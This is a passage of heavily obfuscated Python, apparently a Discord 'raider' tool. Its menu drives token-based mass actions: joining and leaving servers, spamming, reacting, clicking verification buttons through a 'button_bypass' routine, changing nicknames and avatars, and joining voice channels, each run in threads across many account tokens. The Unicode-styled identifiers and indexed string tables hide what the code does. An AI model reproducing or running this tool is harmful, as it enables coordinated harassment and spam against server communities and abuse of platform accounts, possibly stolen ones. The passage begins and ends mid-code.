        𝘫𝘴𝗼𝙣_𝘥𝘢𝘵𝗮 = {𝘐𝙉𝙄𝗡𝘭𝙡𝘐𝘔𝗜𝗜𝗹𝗠𝗹𝙡𝙄𝙡𝗹𝙉𝗡𝘐𝘭𝗹𝘔𝙉𝘭𝗡𝗹𝘔𝙄𝙈𝙄𝘔[305]: 3, 𝘐𝙉𝗜𝗡𝙡𝙡𝙄𝗠𝙄𝘐𝗹𝗠𝗹𝗹𝗜𝘭𝙡𝘕𝙉𝙄𝙡𝘭𝗠𝙉𝗹𝘕𝙡𝙈𝗜𝘔𝘐𝘔[330]: 𝘐𝘕𝗜𝗡𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝘔𝗹𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝙡𝗡𝙡𝗠𝙄𝗠𝙄𝗠[22], 𝙄𝗡𝘐𝗡𝗹𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝗹𝙄𝗹𝗹𝗡𝗡𝗜𝗹𝙡𝗠𝙉𝘭𝙉𝘭𝙈𝙄𝗠𝗜𝗠[161]: 𝙜𝘶𝘪𝗹𝗱_𝘪𝙙, 𝘐𝘕𝗜𝘕𝙡𝙡𝗜𝗠𝙄𝗜𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝘔𝘐𝙈𝘐𝙈[261]: 𝙘𝙝𝗮𝗻𝗻𝘦𝙡_𝘪𝗱, 𝗜𝙉𝙄𝘕𝗹𝙡𝙄𝙈𝙄𝗜𝗹𝘔𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝘕𝙡𝙈𝙄𝘔𝙄𝘔[331]: 0, 𝘐𝗡𝙄𝘕𝗹𝙡𝘐𝘔𝗜𝘐𝗹𝘔𝙡𝙡𝘐𝙡𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝗡𝙡𝙉𝗹𝘔𝗜𝘔𝘐𝗠[332]: 𝙢𝙚𝙨𝘀𝘢𝙜𝙚_𝘪𝗱, 𝗜𝗡𝗜𝙉𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝘭𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝗡𝘭𝗡𝘭𝙈𝙄𝘔𝗜𝘔[333]: 𝘮𝘦𝘀𝙨𝗮𝗴𝘦𝗯𝗼𝙩𝙩𝘰𝙘𝙡𝙞𝗰𝗸[𝙄𝘕𝘐𝙉𝘭𝗹𝗜𝙈𝙄𝗜𝗹𝙈𝗹𝙡𝗜𝘭𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝘕𝙡𝘕𝘭𝘔𝗜𝗠𝘐𝘔[334]][𝘐𝘕𝙄𝙉𝘭𝗹𝗜𝙈𝗜𝙄𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝙡𝗡𝘭𝙈𝙄𝙈𝗜𝘔[160]], 𝙄𝘕𝙄𝗡𝘭𝙡𝘐𝗠𝗜𝗜𝘭𝗠𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝗡𝘭𝙉𝙡𝗠𝗜𝘔𝗜𝗠[141]: 𝘂𝘂𝗶𝘥.uuid4().hex, 𝙄𝙉𝗜𝙉𝗹𝙡𝘐𝗠𝗜𝘐𝗹𝗠𝗹𝙡𝗜𝗹𝙡𝘕𝘕𝙄𝗹𝘭𝗠𝘕𝘭𝗡𝙡𝗠𝗜𝙈𝗜𝗠[17]: {𝘐𝘕𝗜𝗡𝗹𝗹𝘐𝙈𝗜𝙄𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝗹𝘭𝗠𝙉𝘭𝙉𝙡𝗠𝘐𝙈𝙄𝘔[335]: 2, 𝗜𝗡𝘐𝗡𝙡𝘭𝗜𝙈𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝙈𝗡𝘭𝙉𝗹𝙈𝙄𝘔𝘐𝙈[336]: 𝗯𝘶𝘁𝙩𝗼𝗻𝙨[𝙁𝗚𝘾5𝗱𝗬𝗪0𝙭𝗶𝗜𝙕𝘵𝙖𝗗𝘾𝗘𝘾𝘩𝗫𝘕𝘘4𝘩𝙌𝘅𝘕𝘅𝙉𝙇𝙑𝙒.mro()[5](𝗼𝗽𝘁𝗶𝙤𝗻𝘣𝘶𝙩𝘁𝗼𝙣)][𝘐𝗡𝙄𝗡𝘭𝙡𝙄𝗠𝗜𝘐𝘭𝘔𝘭𝗹𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝘕𝙡𝘕𝙡𝘔𝘐𝘔𝘐𝗠[336]]}}
        𝗿𝙧 = 𝗿𝙚𝘲𝙪𝘦𝙨𝘁𝘀.post(𝙄𝘕𝙄𝙉𝘭𝙡𝗜𝗠𝘐𝘐𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝙉𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝙡𝙈𝘐𝘔𝙄𝙈[337], headers=𝗵𝘦𝗮𝘥𝗲𝘳𝙨, json=𝙟𝘀𝙤𝙣_𝙙𝙖𝘵𝙖)
    except:
        𝙥𝘳𝙞𝙣𝘵(f"{𝙧}{𝗜𝙉𝗜𝙉𝘭𝘭𝘐𝘔𝗜𝗜𝘭𝙈𝗹𝗹𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝘭𝙈𝗡𝘭𝙉𝙡𝗠𝘐𝘔𝘐𝘔[91]}{𝗱𝙖𝙩𝗲𝙩𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝗜𝘕𝘐𝘕𝙡𝘭𝗜𝘔𝗜𝘐𝘭𝘔𝘭𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝙡𝘕𝙡𝗠𝙄𝘔𝗜𝙈[92]}{𝘳}')}{𝗜𝗡𝙄𝗡𝗹𝘭𝘐𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝙡𝘕𝙉𝗜𝗹𝘭𝗠𝙉𝘭𝗡𝗹𝘔𝗜𝗠𝙄𝗠[93]}{𝙧}{𝙄𝘕𝙄𝗡𝘭𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝙡𝘕𝘕𝘐𝗹𝙡𝘔𝘕𝘭𝗡𝗹𝙈𝙄𝗠𝙄𝙈[91]}{𝗯}{𝘐𝘕𝙄𝘕𝘭𝘭𝙄𝙈𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝙄𝙡𝘭𝗠𝙉𝘭𝙉𝙡𝘔𝘐𝙈𝙄𝗠[314]}{𝘳}{𝙄𝘕𝗜𝙉𝘭𝘭𝘐𝘔𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝗹𝘔𝘕𝘭𝘕𝙡𝙈𝘐𝙈𝙄𝙈[93]}{𝙣𝘯}{𝙄𝘕𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝘭𝙡𝘕𝗡𝗜𝗹𝙡𝘔𝗡𝘭𝗡𝙡𝙈𝙄𝙈𝗜𝘔[270]}{𝗿𝘳.text}")

class Menu:

    def __init__(self):
        𝘀𝙚𝘵𝙖𝘵𝘵𝗿(𝙨𝘦𝙡𝘧, 'raider', 𝙍𝙖𝗶𝗱𝙚𝙧())
        𝙨𝘦𝘵𝘢𝙩𝘵𝙧(𝘴𝗲𝙡𝗳, 'options', {𝗜𝗡𝘐𝗡𝙡𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝗹𝘭𝗜𝘭𝘭𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝙉𝗹𝘔𝘐𝙈𝙄𝗠[338]: 𝘀𝘦𝙡𝘧.joiner, 𝙄𝘕𝙄𝗡𝗹𝗹𝘐𝘔𝙄𝗜𝘭𝗠𝘭𝙡𝙄𝙡𝘭𝘕𝘕𝙄𝗹𝙡𝗠𝘕𝗹𝙉𝗹𝗠𝙄𝙈𝙄𝙈[339]: 𝘴𝗲𝗹𝗳.leaver, 𝙄𝙉𝙄𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝙉𝙡𝗡𝙡𝘔𝘐𝗠𝗜𝙈[340]: 𝘀𝙚𝘭𝙛.spammer, 𝗜𝘕𝙄𝗡𝗹𝙡𝗜𝙈𝗜𝙄𝙡𝘔𝘭𝘭𝙄𝗹𝘭𝘕𝘕𝙄𝗹𝘭𝘔𝘕𝘭𝗡𝙡𝘔𝙄𝗠𝗜𝘔[341]: 𝙨𝘦𝘭𝗳.Checker, 𝗜𝘕𝗜𝙉𝙡𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝘭𝙡𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝘐𝙈[342]: 𝘴𝗲𝗹𝘧.reactor, 𝗜𝙉𝘐𝘕𝗹𝙡𝙄𝗠𝗜𝗜𝙡𝗠𝙡𝘭𝘐𝙡𝗹𝗡𝙉𝘐𝗹𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝘐𝘔𝗜𝘔[343]: 𝙨𝗲𝘭𝙛.formater, 𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝗡𝙉𝗜𝘭𝗹𝙈𝘕𝘭𝙉𝙡𝙈𝘐𝗠𝙄𝙈[344]: 𝙨𝙚𝗹𝘧.button_click, 𝘐𝙉𝗜𝘕𝗹𝘭𝘐𝗠𝙄𝙄𝗹𝗠𝗹𝗹𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝘔𝙄𝙈[345]: 𝘀𝘦𝗹𝘧.accept_rules, 𝘐𝗡𝙄𝗡𝘭𝗹𝗜𝗠𝗜𝘐𝙡𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝗜𝘭𝙡𝘔𝙉𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝙈[346]: 𝘴𝗲𝙡𝗳.Check_guild, 𝗜𝗡𝙄𝗡𝙡𝙡𝙄𝘔𝙄𝙄𝘭𝗠𝙡𝗹𝘐𝘭𝙡𝘕𝙉𝘐𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝙈𝗜𝘔𝗜𝘔[288]: 𝙨𝘦𝗹𝘧.Change_bio, 𝘐𝘕𝙄𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝙡𝙈𝘭𝗹𝗜𝙡𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝙉𝗹𝗡𝗹𝘔𝗜𝗠𝙄𝙈[347]: 𝘀𝘦𝗹𝘧.Onliner, 𝘐𝙉𝗜𝙉𝙡𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝙡𝙡𝘐𝘭𝘭𝘕𝗡𝘐𝘭𝗹𝘔𝙉𝗹𝗡𝗹𝗠𝘐𝙈𝘐𝗠[348]: 𝙨𝘦𝙡𝗳.voicejoiner, 𝗜𝘕𝗜𝗡𝙡𝘭𝘐𝗠𝗜𝗜𝗹𝙈𝙡𝘭𝗜𝙡𝗹𝘕𝘕𝙄𝗹𝙡𝗠𝙉𝗹𝙉𝗹𝗠𝘐𝙈𝘐𝘔[349]: 𝙨𝙚𝗹𝘧.Nick, 𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝙈𝗜𝗜𝙡𝘔𝘭𝗹𝘐𝘭𝗹𝘕𝙉𝘐𝙡𝙡𝘔𝙉𝘭𝙉𝙡𝙈𝘐𝗠𝗜𝘔[350]: 𝘴𝙚𝙡𝗳.thread, 𝘐𝘕𝗜𝗡𝘭𝙡𝗜𝗠𝙄𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝗡𝙄𝘭𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝗠𝘐𝗠[351]: 𝘴𝘦𝘭𝙛.forms, 𝗜𝙉𝗜𝙉𝙡𝗹𝘐𝗠𝘐𝗜𝘭𝗠𝗹𝘭𝘐𝗹𝘭𝗡𝘕𝘐𝘭𝘭𝙈𝘕𝙡𝙉𝙡𝙈𝗜𝙈𝘐𝘔[352]: 𝘴𝘦𝘭𝙛.avatar, 𝗜𝗡𝙄𝘕𝙡𝗹𝗜𝗠𝙄𝗜𝙡𝘔𝗹𝙡𝗜𝗹𝙡𝙉𝙉𝗜𝙡𝗹𝙈𝗡𝗹𝘕𝗹𝗠𝗜𝘔𝘐𝘔[353]: 𝘴𝗲𝗹𝙛.exit})

    def main_menu(self):
        𝗰𝘰𝘯𝘴𝗼𝗹𝗲.run()
        𝘤𝘩𝗼𝙞𝗰𝙚 = 𝗶𝙣𝘱𝙪𝙩(f'{𝘐𝘕𝙄𝘕𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝗹𝙡𝙄𝘭𝗹𝘕𝗡𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝘭𝘔𝗜𝗠𝗜𝗠[354]}{𝘳}{𝙄𝗡𝗜𝘕𝙡𝙡𝙄𝙈𝙄𝙄𝘭𝗠𝙡𝙡𝙄𝗹𝗹𝘕𝙉𝘐𝙡𝙡𝙈𝘕𝙡𝗡𝘭𝘔𝗜𝘔𝙄𝘔[91]}{𝙡𝗰}{𝙄𝘕𝘐𝘕𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝘔𝘭𝙡𝙄𝙡𝗹𝙉𝙉𝗜𝘭𝘭𝗠𝗡𝘭𝙉𝘭𝗠𝘐𝘔𝘐𝘔[355]}{𝗿}{𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝙈𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝗹𝘭𝘕𝗡𝗜𝘭𝗹𝙈𝙉𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝙈[157]}{𝘨}{𝗿}{𝗜𝗡𝘐𝙉𝘭𝙡𝙄𝗠𝗜𝘐𝘭𝙈𝗹𝗹𝘐𝗹𝘭𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝙡𝙈𝗜𝙈𝗜𝙈[98]}')
        if 𝘤𝗵𝙤𝗶𝗰𝙚 in 𝘴𝘦𝘭𝙛.options:
            𝘴𝗲𝗹𝘧.options[𝙘𝘩𝘰𝙞𝙘𝙚]()
        else:
            𝘀𝘦𝙡𝗳.main_menu()

    def run(self, func, args):
        𝘵𝙝𝙧𝙚𝘢𝘥𝘴 = []
        𝘤𝗼𝙣𝘴𝙤𝗹𝗲.render_ascii()
        for 𝙖𝙧𝗴 in 𝙖𝘳𝘨𝘀:
            𝙩𝙝𝗿𝘦𝘢𝙙 = 𝙩𝘩𝘳𝘦𝘢𝘥𝘪𝗻𝘨.Thread(target=𝙛𝘂𝗻𝙘, args=𝙖𝗿𝗴)
            𝙩𝙝𝘳𝗲𝙖𝙙𝘀.append(𝘵𝙝𝙧𝘦𝘢𝗱)
            𝘵𝗵𝙧𝘦𝙖𝗱.start()
        for 𝘁𝗵𝘳𝙚𝙖𝗱 in 𝘁𝘩𝗿𝙚𝗮𝗱𝘴:
            𝙩𝙝𝘳𝗲𝗮𝘥.join()
        𝘱𝘳𝙞𝗻𝘵(𝗜𝗡𝙄𝘕𝗹𝘭𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝘭𝙄𝗹𝙡𝘕𝙉𝗜𝘭𝙡𝗠𝗡𝗹𝗡𝘭𝘔𝘐𝗠𝗜𝙈[356])
        𝙤𝙨.system(𝙄𝙉𝘐𝙉𝗹𝗹𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝘭𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝘭𝗠𝙉𝗹𝗡𝙡𝘔𝘐𝙈𝘐𝙈[357])
        𝙨𝘦𝗹𝙛.main_menu()

    @𝘸𝘳𝗮𝙥𝘱𝗲𝘳
    def avatar(self):
        𝘰𝘴.system(𝙄𝘕𝙄𝘕𝘭𝙡𝗜𝗠𝙄𝙄𝗹𝘔𝗹𝘭𝙄𝘭𝙡𝗡𝙉𝘐𝙡𝙡𝙈𝙉𝙡𝗡𝙡𝗠𝙄𝘔𝙄𝘔[358])
        𝙤𝘴.system(𝙄𝗡𝘐𝗡𝗹𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝙡𝙡𝘐𝘭𝙡𝙉𝗡𝙄𝙡𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝙈𝗜𝙈[1])
        𝙥𝘳𝗶𝗻𝘁(𝗺𝗲𝙣𝘶)
        for 𝙩𝙤𝙠𝗲𝘯 in 𝙩𝗼𝙠𝗲𝘯𝙨:
            𝘵𝙝𝘳𝘦𝗮𝘥𝙞𝗻𝘨.Thread(target=𝙖𝘃𝗮𝘁𝗮𝗿_𝙘𝘩𝘢𝙣𝙜𝙚𝗿, args=𝙩𝙤𝘬𝙚𝙣).start()
        𝙚𝘹𝘪𝘵 = 𝗶𝗻𝘱𝙪𝘵(𝙄𝙉𝗜𝗡𝙡𝙡𝘐𝗠𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝙈𝙄𝘔[22])
        𝗲𝘹𝗶𝘵 = 𝗠𝘦𝗻𝙪().main_menu()
        𝗲𝘹𝘪𝙩()

    @𝘄𝗿𝙖𝙥𝘱𝘦𝗿
    def formater(self):
        𝙤𝘀.system(𝘐𝘕𝘐𝘕𝙡𝗹𝙄𝙈𝙄𝗜𝙡𝙈𝗹𝘭𝗜𝘭𝙡𝘕𝘕𝗜𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝗠𝙄𝘔𝗜𝗠[359])
        try:
            𝗰𝙡𝙚𝘢𝗻 = []
            𝗼𝙨.system(𝘐𝗡𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝗜𝙡𝗠𝗹𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝙈𝘕𝙡𝙉𝙡𝙈𝙄𝙈𝘐𝘔[1])
            𝙥𝗿𝘪𝗻𝙩(𝗺𝗲𝗻𝙪)
            with 𝗼𝙥𝙚𝙣(𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝙡𝙡𝗡𝘕𝙄𝙡𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝙈𝗜𝘔[59], 𝗜𝗡𝗜𝘕𝘭𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝗡𝗜𝗹𝗹𝘔𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝗠[30]) as 𝗳:
                𝗹𝙞𝙣𝗲𝘀 = 𝗳.read().splitlines()
                for 𝙡𝗶𝗻𝘦 in 𝘭𝘪𝙣𝙚𝘴:
                    𝘴𝗽𝗹𝘪𝙩 = 𝘭𝗶𝙣𝙚.split(𝘐𝙉𝘐𝘕𝘭𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝗹𝘭𝙄𝗹𝘭𝘕𝗡𝙄𝙡𝗹𝙈𝙉𝙡𝙉𝘭𝗠𝙄𝙈𝘐𝙈[360])
                    𝘤𝙡𝗲𝘢𝗻.append(𝘴𝘱𝙡𝙞𝘵[2])
            with 𝙤𝗽𝘦𝗻(𝗜𝘕𝘐𝘕𝙡𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝘭𝗹𝙄𝘭𝘭𝘕𝘕𝙄𝙡𝘭𝘔𝘕𝗹𝘕𝙡𝗠𝘐𝙈𝘐𝙈[59], 𝗜𝘕𝘐𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝙡𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝗡𝘐𝘭𝗹𝙈𝙉𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝗠[21]) as 𝙛:
                for 𝙩𝙤𝗸𝙚𝘯 in 𝙘𝙡𝗲𝘢𝘯:
                    𝗳.write(f'{𝙩𝘰𝗸𝗲𝘯}{𝙄𝗡𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝙡𝘔𝗹𝙡𝘐𝙡𝗹𝙉𝘕𝙄𝗹𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝘔𝗜𝘔[63]}')
            𝘱𝗿𝗶𝙣𝙩(f'{𝘳}{𝗜𝙉𝙄𝗡𝘭𝗹𝙄𝗠𝙄𝘐𝙡𝘔𝙡𝙡𝘐𝙡𝘭𝘕𝗡𝘐𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝙈𝗜𝙈𝙄𝙈[91]}{𝘭𝗰}{𝘐𝗡𝙄𝗡𝘭𝗹𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝙡𝗹𝙉𝘕𝘐𝙡𝘭𝗠𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝙄𝙈[361]}{𝗿}{𝘐𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝗜𝘐𝙡𝘔𝗹𝙡𝘐𝘭𝗹𝙉𝗡𝗜𝗹𝗹𝘔𝘕𝘭𝙉𝙡𝘔𝙄𝗠𝗜𝙈[362]}{𝘭𝙘}{𝙡𝗲𝙣(𝙩𝙤𝘬𝘦𝙣𝙨)}{𝙧}{𝘐𝘕𝗜𝙉𝘭𝗹𝙄𝘔𝗜𝘐𝗹𝗠𝗹𝗹𝙄𝙡𝘭𝘕𝘕𝘐𝙡𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝘐𝗠[363]}')
        except:
            pass
        𝗲𝘅𝘪𝘵 = 𝙞𝘯𝗽𝘂𝘁(𝗜𝘕𝙄𝗡𝘭𝗹𝗜𝘔𝘐𝙄𝗹𝘔𝙡𝙡𝙄𝙡𝙡𝗡𝗡𝗜𝙡𝘭𝗠𝗡𝗹𝗡𝙡𝙈𝘐𝗠𝘐𝘔[22])
        𝗲𝙭𝙞𝘁 = 𝙈𝘦𝙣𝘂().main_menu()
        𝙚𝘹𝙞𝙩()

    @𝘄𝙧𝙖𝘱𝙥𝙚𝗿
    def button_click(self):
        𝙤𝙨.system(𝙄𝙉𝗜𝙉𝙡𝘭𝙄𝙈𝗜𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝗹𝗡𝘕𝙄𝙡𝙡𝙈𝘕𝗹𝙉𝗹𝙈𝘐𝗠𝙄𝗠[90])
        𝙢𝗲𝘴𝘴𝗮𝘨𝗲𝗹𝘪𝗻𝙠 = 𝗶𝘯𝘱𝘂𝘵(f'{𝙧}{𝘐𝗡𝙄𝙉𝗹𝘭𝘐𝗠𝘐𝙄𝘭𝗠𝙡𝘭𝘐𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝘭𝘔𝗜𝙈𝙄𝙈[91]}{𝘭𝘤}{𝘐𝙉𝘐𝘕𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝗜𝙡𝘭𝗠𝗡𝗹𝙉𝙡𝙈𝙄𝙈𝙄𝗠[364]}{𝙧}{𝘐𝗡𝗜𝘕𝘭𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝘔[365]}')
        𝘱𝗿𝙞𝙣𝘁(f'{𝘳}{𝙄𝗡𝘐𝙉𝘭𝗹𝗜𝘔𝗜𝙄𝘭𝙈𝘭𝘭𝙄𝗹𝘭𝘕𝙉𝘐𝙡𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝘔𝗜𝙈[366]}{𝗹𝘤}{𝗜𝗡𝘐𝙉𝙡𝙡𝘐𝗠𝘐𝘐𝙡𝗠𝘭𝘭𝘐𝙡𝙡𝙉𝗡𝘐𝙡𝙡𝗠𝘕𝘭𝗡𝙡𝙈𝘐𝘔𝘐𝘔[231]}{𝘳}{𝘐𝗡𝘐𝙉𝗹𝙡𝙄𝙈𝗜𝘐𝘭𝘔𝗹𝙡𝘐𝙡𝗹𝙉𝘕𝘐𝙡𝘭𝙈𝙉𝙡𝗡𝗹𝘔𝗜𝘔𝘐𝗠[367]}')
        𝘣𝘶𝙩𝙩𝘰𝗻𝗼𝗽𝘵𝘪𝗼𝘯 = 𝘪𝘯𝙥𝙪𝙩(f'{𝗿}{𝘐𝘕𝘐𝗡𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝙈𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝗠𝗡𝗹𝙉𝘭𝘔𝙄𝙈𝙄𝘔[91]}{𝙡𝘤}{𝙄𝘕𝗜𝘕𝗹𝗹𝙄𝗠𝘐𝗜𝗹𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝘐𝙈[368]}{𝗿}{𝙄𝗡𝙄𝙉𝗹𝘭𝗜𝘔𝗜𝘐𝘭𝗠𝘭𝗹𝘐𝗹𝘭𝗡𝙉𝙄𝘭𝙡𝗠𝘕𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝗠[365]}')
        𝗼𝙨.system(𝙄𝗡𝙄𝗡𝗹𝙡𝘐𝘔𝘐𝗜𝙡𝙈𝘭𝗹𝘐𝘭𝗹𝗡𝘕𝙄𝙡𝗹𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝘔𝘐𝗠[1])
        𝗽𝘳𝘪𝙣𝘵(𝗺𝘦𝗻𝘶)
        for 𝘁𝙤𝘬𝗲𝗻 in 𝙩𝗼𝘬𝘦𝙣𝙨:
            𝘵𝘩𝗿𝙚𝗮𝙙𝙞𝗻𝘨.Thread(target=𝙗𝙪𝙩𝘵𝙤𝗻_𝙗𝘆𝙥𝗮𝙨𝘀, args=(𝘁𝙤𝗸𝘦𝘯, 𝘮𝗲𝘴𝘀𝙖𝗴𝗲𝗹𝘪𝘯𝙠, 𝙗𝙪𝘵𝘵𝘰𝗻𝙤𝙥𝙩𝙞𝗼𝘯)).start()
        𝗲𝙭𝗶𝘁 = 𝘪𝗻𝙥𝙪𝘵(𝗜𝙉𝘐𝘕𝗹𝘭𝙄𝙈𝗜𝙄𝘭𝙈𝙡𝗹𝙄𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝘐𝙈[22])
        𝗲𝘅𝗶𝘁 = 𝘔𝘦𝘯𝙪().main_menu()
        𝙚𝘅𝗶𝙩()

    @𝘄𝗿𝘢𝙥𝗽𝙚𝙧
    def reactor(self):
        𝗼𝘴.system(𝗜𝘕𝘐𝘕𝙡𝘭𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝗜𝙡𝘭𝙉𝙉𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝗹𝙈𝗜𝙈𝙄𝗠[90])
        𝘮𝘦𝘀𝘴𝗮𝙜𝘦_𝘭𝗶𝙣𝘬 = 𝘪𝗻𝗽𝙪𝘵(f'{𝙧}{𝘐𝗡𝘐𝘕𝙡𝗹𝙄𝗠𝘐𝗜𝙡𝘔𝙡𝙡𝙄𝗹𝗹𝗡𝘕𝗜𝙡𝙡𝙈𝙉𝘭𝗡𝗹𝘔𝙄𝗠𝙄𝘔[91]}{𝘭𝘤}{𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝗠𝙡𝙡𝙄𝙡𝗹𝘕𝘕𝙄𝙡𝘭𝘔𝙉𝗹𝘕𝙡𝗠𝗜𝙈𝘐𝗠[364]}{𝙧}{𝘐𝙉𝙄𝘕𝙡𝗹𝗜𝘔𝘐𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝙡𝙉𝘕𝙄𝙡𝙡𝙈𝗡𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝙈[365]}')
        if 𝙢𝗲𝘴𝘴𝙖𝘨𝘦_𝙡𝙞𝙣𝙠 == 𝙄𝙉𝙄𝘕𝘭𝘭𝙄𝘔𝗜𝙄𝘭𝗠𝙡𝗹𝘐𝘭𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝘭𝙉𝘭𝙈𝘐𝗠𝘐𝗠[22]:
            𝗠𝘦𝙣𝙪().main_menu()
        𝗽𝘳𝘪𝘯𝙩(f'{𝘳}{𝗜𝗡𝗜𝙉𝙡𝗹𝗜𝗠𝘐𝗜𝙡𝘔𝙡𝗹𝘐𝙡𝗹𝙉𝗡𝙄𝘭𝙡𝗠𝘕𝗹𝘕𝗹𝙈𝗜𝙈𝗜𝙈[369]}{𝘭𝘤}{𝗜𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝙄𝘐𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝗡𝘐𝗹𝗹𝘔𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝘔[231]}{𝗿}{𝘐𝗡𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝙄𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝗡𝙡𝗠𝙄𝘔𝗜𝘔[370]}')
